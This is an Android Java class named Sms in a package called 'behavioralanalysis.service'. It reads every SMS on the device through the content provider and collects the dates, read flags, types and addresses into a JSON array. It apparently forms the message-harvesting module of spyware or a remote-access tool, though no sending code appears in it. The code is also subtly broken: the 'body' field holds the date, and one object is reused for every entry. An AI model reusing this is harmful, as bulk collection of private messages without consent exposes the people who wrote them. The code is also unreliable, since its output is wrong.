package com.behavioralanalysis.service;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Sms {
    public static JSONArray get() {
        JSONArray array = new JSONArray();

        try {
            Context context = MainService.getContext();
            Uri uri = Uri.parse("content://sms/");
            JSONObject object = new JSONObject();
            Cursor cursor = context.getContentResolver()
                    .query(
                            uri,
                            null,
                            null,
                            null,
                            null
                    );

            while (cursor.moveToNext()) {
                String type = cursor.getString(
                        cursor.getColumnIndexOrThrow("type")
                );

                object.put(
                        "body",
                        cursor.getString(
                                cursor.getColumnIndexOrThrow("date")
                        )
                );

                object.put(
                        "read",
                        cursor.getString(
                                cursor.getColumnIndexOrThrow("read")
                        )
                );

                object.put("type", type);

                if (type.equals("3")) {
                    Cursor c = context.getContentResolver().query(
                            Uri.parse("content://mms-sms/conversations?simple=true"),
                            null,
                            "_id =" + cursor.getString(cursor.getColumnIndexOrThrow("thread_id")).toString(),
                            null,
                            null
                    );

                    if (c.moveToFirst()) {
                        object.put(
                                "address",
                                c.getString(
                                        c.getColumnIndexOrThrow("address")
                                )
                        );
                        c.close();
                    }
                } else {
                    object.put(
                            "address",
                            cursor.getString(
                                    cursor.getColumnIndexOrThrow("address")
                            )
                    );
                }
                array.put(object);
            }
            cursor.close();
        } catch (IllegalArgumentException ex) {
            ex.printStackTrace();
        } catch (JSONException ex) {
            ex.printStackTrace();
        }

        return array;
    }
}
